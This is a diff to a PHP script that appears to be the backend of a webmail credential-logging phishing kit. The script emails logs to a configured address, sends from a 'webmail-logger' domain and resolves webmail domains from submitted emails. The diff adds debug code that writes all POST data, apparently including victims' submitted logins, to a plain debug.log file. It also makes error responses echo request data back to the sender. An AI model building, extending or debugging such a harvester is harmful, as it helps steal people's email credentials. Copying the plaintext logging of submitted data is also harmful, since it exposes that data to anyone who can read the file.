@@ -6,6 +6,10 @@ ini_set('display_errors', 0);
 // Set content type for JSON response
 header('Content-Type: application/json');
 
+// Debug logging (remove this in production)
+$debug_log = "DEBUG: " . date('Y-m-d H:i:s') . " | Method: " . $_SERVER['REQUEST_METHOD'] . " | URI: " . ($_SERVER['REQUEST_URI'] ?? 'unknown') . " | POST: " . json_encode($_POST) . "\n";
+@file_put_contents('debug.log', $debug_log, FILE_APPEND | LOCK_EX);
+
 // Email configuration - CHANGE THESE VALUES
 $LOG_EMAIL = 'your-email@example.com';  // Change this to your email address
 $FROM_EMAIL = 'noreply@webmail-logger.com';  // Change this to your domain
@@ -131,7 +135,16 @@ function getWebmailDomain($email) {
 // Check if this is a POST request
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     http_response_code(405);
-    echo json_encode(array('signal' => 'ERROR', 'msg' => 'Method not allowed'));
+    echo json_encode(array(
+        'signal' => 'ERROR', 
+        'msg' => 'Method not allowed - Received: ' . $_SERVER['REQUEST_METHOD'],
+        'debug' => array(
+            'method' => $_SERVER['REQUEST_METHOD'],
+            'post_data' => $_POST,
+            'get_data' => $_GET,
+            'request_uri' => $_SERVER['REQUEST_URI'] ?? 'unknown'
+        )
+    ));
     exit;
 }
 
